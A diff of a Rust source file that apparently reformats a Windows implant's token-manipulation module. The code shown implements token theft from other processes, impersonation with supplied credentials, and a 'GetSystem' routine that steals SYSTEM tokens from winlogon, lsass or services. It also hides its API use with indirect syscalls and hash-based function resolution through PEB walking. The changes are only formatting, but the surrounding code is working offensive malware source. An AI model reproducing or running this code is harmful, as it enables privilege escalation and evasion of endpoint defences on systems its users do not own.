@@ -14,8 +14,8 @@
 use anyhow::{anyhow, Context, Result};
 use std::sync::{Mutex, OnceLock};
 use winapi::um::winnt::{
-    HANDLE, TOKEN_ALL_ACCESS, TOKEN_DUPLICATE,
-    TOKEN_QUERY, SecurityImpersonation, TokenImpersonation,
+    SecurityImpersonation, TokenImpersonation, HANDLE, TOKEN_ALL_ACCESS, TOKEN_DUPLICATE,
+    TOKEN_QUERY,
 };
 // CloseHandle removed — using NtClose indirect syscall exclusively.
 
@@ -78,8 +78,8 @@ fn nt_error(status: i32) -> bool {
 
 /// Call `NtOpenProcess` via indirect syscall to obtain a HANDLE to a process.
 unsafe fn nt_open_process(pid: u32) -> Result<HANDLE> {
-    use winapi::um::winnt::PROCESS_QUERY_LIMITED_INFORMATION;
     use winapi::shared::ntdef::OBJECT_ATTRIBUTES;
+    use winapi::um::winnt::PROCESS_QUERY_LIMITED_INFORMATION;
 
     #[repr(C)]
     struct CLIENT_ID {
@@ -122,15 +122,13 @@ unsafe fn nt_open_process_token(process: HANDLE, access: u32) -> Result<HANDLE> 
     let status = crate::syscalls::do_syscall(
         target.ssn,
         target.gadget_addr,
-        &[
-            process as u64,
-            access as u64,
-            &mut token as *mut _ as u64,
-        ],
+        &[process as u64, access as u64, &mut token as *mut _ as u64],
     );
 
     if nt_error(status) {
-        Err(anyhow!("NtOpenProcessToken failed: NTSTATUS 0x{status:08X}"))
+        Err(anyhow!(
+            "NtOpenProcessToken failed: NTSTATUS 0x{status:08X}"
+        ))
     } else {
         Ok(token)
     }
@@ -150,11 +148,7 @@ fn nt_close_handle(handle: u64) {
 ///
 /// `open_as_self` should be `true` when opening the calling thread's token
 /// while impersonating (otherwise the call uses the process identity).
-unsafe fn nt_open_thread_token(
-    thread: HANDLE,
-    access: u32,
-    open_as_self: bool,
-) -> Result<HANDLE> {
+unsafe fn nt_open_thread_token(thread: HANDLE, access: u32, open_as_self: bool) -> Result<HANDLE> {
     let mut token: HANDLE = std::ptr::null_mut();
     let target = crate::syscalls::get_syscall_id("NtOpenThreadToken")
         .map_err(|e| anyhow!("failed to resolve NtOpenThreadToken SSN: {e}"))?;
@@ -252,12 +246,8 @@ const SYSTEM_PROCESS_INFORMATION: u32 = 5;
 
 /// Call `NtDuplicateToken` via indirect syscall to create a new impersonation
 /// or primary token from an existing token.
-unsafe fn nt_duplicate_token(
-    existing: HANDLE,
-    access: u32,
-    token_type: u32,
-) -> Result<HANDLE> {
-    use winapi::um::winnt::{SECURITY_QUALITY_OF_SERVICE};
+unsafe fn nt_duplicate_token(existing: HANDLE, access: u32, token_type: u32) -> Result<HANDLE> {
+    use winapi::um::winnt::SECURITY_QUALITY_OF_SERVICE;
 
     let mut new_token: HANDLE = std::ptr::null_mut();
 
@@ -307,12 +297,7 @@ unsafe fn nt_duplicate_token(
 ///
 /// On success, the new token is applied to the calling thread and the
 /// original token is saved for `Rev2Self`.
-pub fn make_token(
-    username: &str,
-    password: &str,
-    domain: &str,
-    logon_type: u32,
-) -> Result<String> {
+pub fn make_token(username: &str, password: &str, domain: &str, logon_type: u32) -> Result<String> {
     let valid_logon_types = [2, 3, 4, 5, 8, 9];
     let lt = if valid_logon_types.contains(&logon_type) {
         logon_type
@@ -322,25 +307,24 @@ pub fn make_token(
 
     let mut token: HANDLE = std::ptr::null_mut();
 
-    let user_cstr = std::ffi::CString::new(username)
-        .map_err(|e| anyhow!("invalid username: {e}"))?;
-    let pass_cstr = std::ffi::CString::new(password)
-        .map_err(|e| anyhow!("invalid password: {e}"))?;
-    let dom_cstr = std::ffi::CString::new(domain)
-        .map_err(|e| anyhow!("invalid domain: {e}"))?;
+    let user_cstr =
+        std::ffi::CString::new(username).map_err(|e| anyhow!("invalid username: {e}"))?;
+    let pass_cstr =
+        std::ffi::CString::new(password).map_err(|e| anyhow!("invalid password: {e}"))?;
+    let dom_cstr = std::ffi::CString::new(domain).map_err(|e| anyhow!("invalid domain: {e}"))?;
 
     // Resolve LogonUserA from advapi32.dll via PEB walking (no IAT entry).
-    let advapi32_base = unsafe {
-        pe_resolve::get_module_handle_by_hash(pe_resolve::hash_str(b"advapi32.dll\0"))
-    }.ok_or_else(|| anyhow!("failed to resolve advapi32.dll base address"))?;
+    let advapi32_base =
+        unsafe { pe_resolve::get_module_handle_by_hash(pe_resolve::hash_str(b"advapi32.dll\0")) }
+            .ok_or_else(|| anyhow!("failed to resolve advapi32.dll base address"))?;
 
     let logon_user_addr = unsafe {
         pe_resolve::get_proc_address_by_hash(advapi32_base, pe_resolve::hash_str(b"LogonUserA\0"))
-    }.ok_or_else(|| anyhow!("failed to resolve LogonUserA"))?;
+    }
+    .ok_or_else(|| anyhow!("failed to resolve LogonUserA"))?;
 
-    type LogonUserAFn = unsafe extern "system" fn(
-        *mut i8, *mut i8, *mut i8, u32, u32, *mut HANDLE,
-    ) -> i32;
+    type LogonUserAFn =
+        unsafe extern "system" fn(*mut i8, *mut i8, *mut i8, u32, u32, *mut HANDLE) -> i32;
 
     let logon_user: LogonUserAFn = unsafe { std::mem::transmute(logon_user_addr) };
 
@@ -365,8 +349,12 @@ pub fn make_token(
 
     // Resolve ImpersonateLoggedOnUser from advapi32.dll via PEB walking.
     let impersonate_addr = unsafe {
-        pe_resolve::get_proc_address_by_hash(advapi32_base, pe_resolve::hash_str(b"ImpersonateLoggedOnUser\0"))
-    }.ok_or_else(|| anyhow!("failed to resolve ImpersonateLoggedOnUser"))?;
+        pe_resolve::get_proc_address_by_hash(
+            advapi32_base,
+            pe_resolve::hash_str(b"ImpersonateLoggedOnUser\0"),
+        )
+    }
+    .ok_or_else(|| anyhow!("failed to resolve ImpersonateLoggedOnUser"))?;
 
     type ImpersonateFn = unsafe extern "system" fn(HANDLE) -> i32;
     let impersonate: ImpersonateFn = unsafe { std::mem::transmute(impersonate_addr) };
@@ -374,7 +362,9 @@ pub fn make_token(
     let ok = unsafe { impersonate(token) };
     let impersonate_result = if ok == 0 {
         let err = unsafe { get_last_error() };
-        Err(anyhow!("ImpersonateLoggedOnUser failed with Win32 error {err}"))
+        Err(anyhow!(
+            "ImpersonateLoggedOnUser failed with Win32 error {err}"
+        ))
     } else {
         Ok(())
     };
@@ -424,9 +414,7 @@ pub fn steal_token(target_pid: u32) -> Result<String> {
             drop(guard);
             // Use pseudo-handle (-1) for current process + indirect syscall.
             let current_process: HANDLE = (-1isize) as HANDLE;
-            let primary = unsafe {
-                nt_open_process_token(current_process, TOKEN_ALL_ACCESS).ok()
-            };
+            let primary = unsafe { nt_open_process_token(current_process, TOKEN_ALL_ACCESS).ok() };
             if let Some(primary) = primary {
                 if !primary.is_null() {
                     let mut guard = saved_primary().lock().unwrap();
@@ -477,7 +465,9 @@ pub fn steal_token(target_pid: u32) -> Result<String> {
         *saved = Some(new_token as usize);
     }
 
-    Ok(format!("StealToken: now impersonating token from PID {target_pid}"))
+    Ok(format!(
+        "StealToken: now impersonating token from PID {target_pid}"
+    ))
 }
 
 /// Revert to the original process token (undo `StealToken` / `MakeToken`).
@@ -562,11 +552,7 @@ pub fn get_system() -> Result<String> {
     }
 
     // Target process names that run as SYSTEM (lowercase ASCII).
-    let system_procs = [
-        "winlogon.exe",
-        "lsass.exe",
-        "services.exe",
-    ];
+    let system_procs = ["winlogon.exe", "lsass.exe", "services.exe"];
 
     // GetCurrentProcessId → NtQueryInformationProcess(ProcessBasicInformation)
     #[repr(C)]
@@ -581,7 +567,7 @@ pub fn get_system() -> Result<String> {
     let _ = crate::syscall!(
         "NtQueryInformationProcess",
         (-1isize) as u64, // NtCurrentProcess()
-        0u64,              // ProcessBasicInformation
+        0u64,             // ProcessBasicInformation
         &mut pbi as *mut _ as u64,
         std::mem::size_of::<Pbi>() as u64,
         std::ptr::null_mut::<u64>() as u64,
@@ -596,9 +582,7 @@ pub fn get_system() -> Result<String> {
             break;
         }
 
-        let entry = unsafe {
-            &*(buffer.as_ptr().add(offset) as *const SystemProcessInformation)
-        };
+        let entry = unsafe { &*(buffer.as_ptr().add(offset) as *const SystemProcessInformation) };
 
         let pid = entry.unique_process_id as u32;
         if pid != 0 && pid != my_pid {
@@ -624,7 +608,11 @@ pub fn get_system() -> Result<String> {
                         })
                         .collect();
                     let name_str = String::from_utf16_lossy(&name_u16);
-                    let filename = name_str.rsplit('\\').next().unwrap_or(&name_str).to_lowercase();
+                    let filename = name_str
+                        .rsplit('\\')
+                        .next()
+                        .unwrap_or(&name_str)
+                        .to_lowercase();
 
                     if system_procs.iter().any(|sp| filename == *sp) {
                         return steal_token(pid);
@@ -652,18 +640,14 @@ pub fn get_system() -> Result<String> {
 /// `HANDLE` when no impersonation token is set.
 pub fn get_current_token() -> HANDLE {
     let saved = SAVED_TOKEN.lock().unwrap();
-    saved
-        .map(|h| h as HANDLE)
-        .unwrap_or(std::ptr::null_mut())
+    saved.map(|h| h as HANDLE).unwrap_or(std::ptr::null_mut())
 }
 
 /// Save the current thread's impersonation token (if any) for later restoration.
 fn save_current_token() {
     // Use pseudo-handle (-2) for current thread.
     let current_thread: HANDLE = (-2isize) as HANDLE;
-    let token_result = unsafe {
-        nt_open_thread_token(current_thread, TOKEN_ALL_ACCESS, true)
-    };
+    let token_result = unsafe { nt_open_thread_token(current_thread, TOKEN_ALL_ACCESS, true) };
 
     let mut saved = SAVED_TOKEN.lock().unwrap();
     match token_result {
